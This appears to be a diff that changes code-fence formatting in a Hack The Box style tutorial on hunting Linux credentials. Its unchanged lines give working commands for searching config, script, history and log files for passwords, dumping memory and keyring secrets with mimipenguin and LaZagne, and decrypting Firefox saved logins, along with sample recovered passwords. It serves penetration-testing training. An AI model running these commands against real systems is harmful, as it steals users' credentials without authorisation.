@@ -28,8 +28,7 @@ Configuration files are the core of the functionality of services on Linux distr
 
 The most crucial part of any system enumeration is to obtain an overview of it. Therefore, the first step should be to find all possible configuration files on the system, which we can then examine and analyze individually in more detail. There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
 
 File extension:  .conf
@@ -69,8 +68,7 @@ File extension:  .cnf
 
 Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (`user`, `password`, `pass`) in each file with the file extension `.cnf`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
 
 File:  /snap/core18/2128/etc/ssl/openssl.cnf
@@ -103,8 +101,7 @@ File:  /etc/mysql/conf.d/mysql.cnf
 
 We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
 
 DB File extension:  .sql
@@ -148,8 +145,7 @@ DB File extension:  .db*
 
 Depending on the environment we are in and the purpose of the host we are on, we can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as `.txt`. Therefore, in this case, we need to search for files including the `.txt` file extension and files that have no file extension at all.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
 
 /home/cry0l1t3/.config/caja/desktop-metadata
@@ -164,8 +160,7 @@ hiimeins@htb[/htb]$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
 
 Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
 
 File extension:  .py
@@ -199,8 +194,7 @@ File extension:  .sh
 
 Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (`/etc/crontab`) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (`/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). The scripts and files used by `cron` can also be found in `/etc/cron.d/` for Debian-based distributions.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat /etc/crontab 
 
 # /etc/crontab: system-wide crontab
@@ -249,8 +243,7 @@ All history files provide crucial information about the current and past/histori
 
 In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in `.bash_history`. Nevertheless, other files like `.bashrc` or `.bash_profile` can contain important information.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ tail -n5 /home/*/.bash*
 
 ==> /home/cry0l1t3/.bash_history <==
@@ -296,8 +289,7 @@ Many different logs exist on the system. These can vary depending on the applica
 
 Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
 
 #### Log file:  /var/log/dpkg.log.1
@@ -317,8 +309,7 @@ hiimeins@htb[/htb]$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accept
 
 Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo python3 mimipenguin.py
 
 [SYSTEM - GNOME]    cry0l1t3:WLpAEXFa0SbqOHY
@@ -354,8 +345,7 @@ An even more powerful tool we can use that was mentioned earlier in the Credenti
 
 For example, `Keyrings` are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo python2.7 laZagne.py all
 
 |====================================================================|
@@ -392,16 +382,14 @@ Browsers store the passwords saved by the user in an encrypted form locally on t
 
 For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in `logins.json` on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.
 
-```
-        shellsession
+```shellsession
 [!bash]$ ls -l .mozilla/firefox/ | grep default 
 
 drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
 drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 
 {
@@ -432,8 +420,7 @@ hiimeins@htb[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | 
 
 The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3.9 firefox_decrypt.py
 
 Select the Mozilla profile you wish to decrypt
@@ -453,8 +440,7 @@ Password: 'FzXUxJemKm6g2lGh'
 
 Alternatively, `LaZagne` can also return results if the user has used the supported browser.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 laZagne.py browsers
 
 |====================================================================|
